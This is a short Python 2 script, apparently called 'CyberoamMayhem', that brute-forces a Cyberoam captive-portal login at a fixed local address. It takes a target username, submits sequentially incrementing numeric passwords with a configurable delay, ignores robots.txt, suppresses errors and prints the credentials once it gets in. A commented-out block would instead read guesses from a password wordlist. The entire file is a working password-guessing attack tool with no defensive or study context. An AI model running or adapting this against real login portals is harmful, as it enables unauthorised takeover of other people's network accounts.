import mechanize
import os
import time
import argparse


url = 'http://10.10.1.2:8090/'
br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
log1 = 'You have successfully logged in'
log2 = 'You have reached Maximum Login Limit'
r = br.open(url)

def logger(user, passer, tLaunch):
    try:
        br.select_form(nr=0)
        br.form['username'] = user
        br.form['password'] = passer
        br.method = "POST"
        response = br.submit()
        content = response.get_data()
        if log1 in content or log2 in content:
            print '[+]Success! User = ' + user + ' password = ' + passer + '\n'
            exit(0)
        else:
            print '[-]Failed!! ' + passer + '\n'
            time.sleep(tLaunch)
            br.back()
    except:
        pass

def main():
	parser = argparse.ArgumentParser(description="Command line argument to pass to CyberoamMayhem")
	parser.add_argument("USERNAME", help="Enter the USERNAME of which password you want to know")
	parser.add_argument("-p", "--password_start", help="Enter a digit from which you want to check (default is 1000)", type=int)
	parser.add_argument("-t", "--time", help="Enter the minimum time betwen two attacks (default is 0.5sec", type = float)
	args = parser.parse_args()
        tLaunch = 0.5         #time between successive attack
        user = args.USERNAME  #username
        logPass = ''          #password
        if(args.password_start):
        	logPass = args.password_start
        else:
        	logPass = 1000
        if(args.time):
                tLaunch = args.time
        # passFile = open('password.txt', 'r') #name of password list in home directory
        # for line in passFile.readlines():
        #    logPass = line.strip('\n')
        #    logger(user,logPass)
        while(True):
                logger(user, str(logPass), tLaunch)
                logPass = logPass + 1
if __name__ == '__main__':
    main()
